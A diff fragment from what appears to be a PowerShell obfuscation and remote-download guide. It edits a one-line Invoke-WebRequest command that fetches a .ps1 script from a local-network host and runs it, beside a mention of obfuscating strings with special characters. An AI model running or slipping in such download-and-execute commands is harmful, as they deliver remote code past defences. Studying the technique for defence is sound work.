@@ -671,9 +671,9 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - File **Invoke-WebRequest.ps1** (trigger download/execution)
 
-      Invoke-WebRequest "http://192.168.1.71/Invoke-Hello.ps1" -OutFile "Invoke-Hello.ps1" -PassThru; Start-Sleep 1; powershell.exe -File Invoke-Hello.ps1
+      Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "hello.ps1" -PassThru; Start-Sleep 1; powershell.exe -File hello.ps1
 
-![powershell Additional Methods for Remote Download](http://i.cubeupload.com/1YYzR3.jpg)
+![powershell Additional Methods for Remote Download](http://i63.tinypic.com/2mpx7wl.jpg)
 
 ---
 
